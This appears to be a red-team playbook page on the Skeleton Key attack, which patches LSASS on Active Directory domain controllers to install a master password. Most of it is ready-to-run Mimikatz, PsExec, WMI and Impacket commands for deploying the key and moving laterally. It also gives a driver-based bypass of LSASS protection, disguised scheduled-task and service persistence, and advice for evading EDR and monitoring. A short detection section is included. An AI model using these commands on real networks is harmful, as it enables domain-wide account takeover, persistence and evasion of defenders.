# Skeleton Key

> **MITRE ATT&CK**: Persistence / Credential Access > T1556.001 - Modify Authentication Process
> **Platforms**: Windows Active Directory
> **Required Privileges**: Domain Admin + SYSTEM on Domain Controller
> **OPSEC Risk**: High (patches LSASS memory on DC, detectable by process monitoring)

---

## Strategic Overview

The Skeleton Key attack patches the LSASS process on a domain controller to install a master password that works alongside every user's legitimate password. After deployment, the attacker can authenticate as any domain user using the master password ("mimikatz" by default) while all users continue to log in normally with their real passwords. For a Red Team Lead, the Skeleton Key is a powerful but high-risk persistence mechanism. Its primary advantage is immediate domain-wide access without needing individual credentials. The critical limitation is that it does not survive a DC reboot -- the LSASS patch is in-memory only, making it volatile persistence. This technique is best used during active operations when continuous domain access is needed for a limited time window, not as a long-term persistence mechanism. Pair it with a more durable technique like a Golden Ticket for sustained access.

## Technical Deep-Dive

### Skeleton Key Deployment

```bash
# Mimikatz - Install Skeleton Key on Domain Controller
# Must be run with SYSTEM privileges on the DC itself

# Method 1: Direct execution on DC (requires console or RDP access)
mimikatz # privilege::debug
mimikatz # misc::skeleton

# Output:
# [KDC] data
# [KDC] struct
# [KDC] keys patch OK
# [RC4] functions
# [RC4] init patch OK
# [RC4] decrypt patch OK

# Method 2: Remote execution via PsExec
psexec.exe \\dc01.corp.local -s mimikatz.exe "privilege::debug" "misc::skeleton" "exit"

# Method 3: Via Cobalt Strike
beacon> mimikatz misc::skeleton
```

### Using the Skeleton Key

```bash
# After skeleton key installation, authenticate as ANY user with password "mimikatz"

# RDP to any machine as any domain user
# Username: CORP\Administrator
# Password: mimikatz    (master password)
# The real password also still works

# PsExec lateral movement
psexec.exe \\target.corp.local -u CORP\anyuser -p mimikatz cmd.exe

# NET USE
net use \\target.corp.local\C$ /user:CORP\Administrator mimikatz

# WMI remote execution
wmic /node:target.corp.local /user:CORP\admin /password:mimikatz process call create "cmd.exe /c whoami > C:\out.txt"

# Impacket (Linux)
psexec.py corp.local/Administrator:mimikatz@target.corp.local
smbexec.py corp.local/anyuser:mimikatz@target.corp.local
wmiexec.py corp.local/Administrator:mimikatz@target.corp.local
```

### How Skeleton Key Works Internally

```
Normal Kerberos Authentication:
1. User sends AS-REQ with encrypted timestamp (using password-derived key)
2. DC decrypts timestamp using user's password hash from AD
3. If valid, DC issues TGT

Skeleton Key Patched Authentication:
1. User sends AS-REQ with encrypted timestamp
2. DC attempts decryption with user's real password hash
3. If that fails, DC attempts decryption with skeleton key hash ("mimikatz")
4. If EITHER succeeds, DC issues TGT

The patch modifies the RC4 decryption function in LSASS to add
the secondary password check. Both the real password and the
skeleton key password work simultaneously.
```

### Skeleton Key Limitations

```
Critical Limitations:
1. NOT persistent across reboots - LSASS patch is memory-only
2. Only works with RC4 authentication (not AES)
3. Must be installed on EVERY DC for reliable access
   (If user authenticates to an unpatched DC, skeleton key fails)
4. Does not work if AES-only Kerberos is enforced
5. Requires SYSTEM privileges on the DC to patch LSASS
6. Modern DCs with Credential Guard/Protected LSASS block this attack

Multi-DC deployment:
- Domain with 3 DCs requires patching all 3
- Users are directed to DCs via DNS/site topology
- Missing even one DC means intermittent access
```

### Deploying on Multiple DCs

```bash
# Enumerate all domain controllers
nltest /dclist:corp.local
# Or via PowerShell:
# [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers

# Deploy skeleton key to each DC
psexec.exe \\dc01.corp.local -s mimikatz.exe "privilege::debug" "misc::skeleton" "exit"
psexec.exe \\dc02.corp.local -s mimikatz.exe "privilege::debug" "misc::skeleton" "exit"
psexec.exe \\dc03.corp.local -s mimikatz.exe "privilege::debug" "misc::skeleton" "exit"

# Verify by authenticating via each DC
runas /netonly /user:CORP\testuser "cmd.exe"
# Enter password: mimikatz
```

### Protected Process Light (PPL) Bypass

```bash
# If LSASS is running as Protected Process Light (PPL),
# standard Mimikatz cannot patch it

# Check if LSASS is protected
# In Task Manager: lsass.exe should not show "Protected" in details
# Or via PowerShell:
# Get-Process lsass | Select-Object -ExpandProperty Path

# Bypass methods:
# 1. Load vulnerable driver to disable PPL (Mimikatz mimidrv.sys)
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton

# 2. Use BYOVD to load signed vulnerable driver
# Load RTCore64.sys or similar to modify LSASS protection level

# 3. Credential Guard completely prevents Skeleton Key
# If Credential Guard is enabled, use alternative persistence methods
```

### Custom Skeleton Key Password

```bash
# By default, the skeleton key password is "mimikatz"
# Custom passwords require modifying Mimikatz source code

# The password hash is hardcoded in the Mimikatz source:
# kuhl_m_misc.c -> kuhl_m_misc_skeleton()
# Modify the RC4 key material to use a custom password hash

# Alternative: Use skeleton key concept with custom tool
# Several open-source implementations allow custom master passwords
```

### Persistence Enhancement Strategies

```bash
# Skeleton Key alone is volatile. Combine with durable persistence:

# 1. Scheduled task to re-deploy after reboot
schtasks /create /s dc01.corp.local /tn "SystemHealth" /tr "C:\Windows\Temp\deploy.bat" /sc onstart /ru SYSTEM /f
# deploy.bat runs Mimikatz to re-install skeleton key

# 2. WMI subscription to detect DC reboot and re-deploy
# Trigger on Win32_LogonSession creation on DC

# 3. Use alongside Golden Ticket
# Golden Ticket for long-term access
# Skeleton Key for convenient any-user access during active operations

# 4. Service-based re-deployment
sc \\dc01.corp.local create SkeletonSvc binpath= "cmd /c mimikatz.exe privilege::debug misc::skeleton exit"
```

## Detection & Evasion

### Detection Mechanisms
- **LSASS process monitoring**: Memory patches to LSASS are detectable by EDR
- **Process injection detection**: Sysmon Event ID 10 (process access to LSASS)
- **Event ID 4673**: Sensitive privilege use (SeDebugPrivilege on DC)
- **Event ID 7045**: Service installation (if using PsExec deployment)
- **Kerberos anomalies**: Authentication pattern analysis (single password for multiple accounts)
- **Memory integrity**: Scanning LSASS memory for known skeleton key signatures
- **Protected Process**: Credential Guard and LSASS PPL prevent the attack entirely

### Evasion Techniques
- Deploy during maintenance windows when DC monitoring may have reduced coverage
- Use custom-compiled Mimikatz with modified signatures to avoid AV/EDR detection
- Deploy via legitimate admin tools (PsExec, PowerShell Remoting) rather than dropping binaries
- Minimize the number of authentications using the skeleton key to avoid pattern detection
- Use the skeleton key only when needed, not for every authentication
- Combine with legitimate credential use to mask skeleton key authentications

### OPSEC Considerations
- This is a noisy technique: patching LSASS on a DC is a high-severity event
- Every authentication using "mimikatz" is potentially detectable via behavioral analysis
- DC reboots (planned maintenance, Windows Updates) will remove the skeleton key
- Multiple DCs must all be patched, multiplying the detection surface
- Always have a backup persistence mechanism (Golden Ticket)
- Document which DCs were patched for post-operation cleanup

## Cross-References

- `04-persistence/golden-ticket-persistence.md` - Golden/Diamond Ticket (durable alternative)
- `04-persistence/dcshadow-persistence.md` - DCShadow (persistent AD modification)
- `07-credential-access/` - Credential extraction from DCs
- `12-active-directory-deep-dive/ad-persistence-deep-dive.md` - Full AD persistence coverage

## References

- MITRE T1556.001: https://attack.mitre.org/techniques/T1556/001/
- Skeleton Key (Mimikatz): https://github.com/gentilkiwi/mimikatz/wiki/module-~-misc
- Skeleton Key Malware Analysis (Dell SecureWorks): https://www.secureworks.com/research/skeleton-key-malware-analysis
- Detecting Skeleton Key: https://adsecurity.org/?p=1275
- Credential Guard: https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/
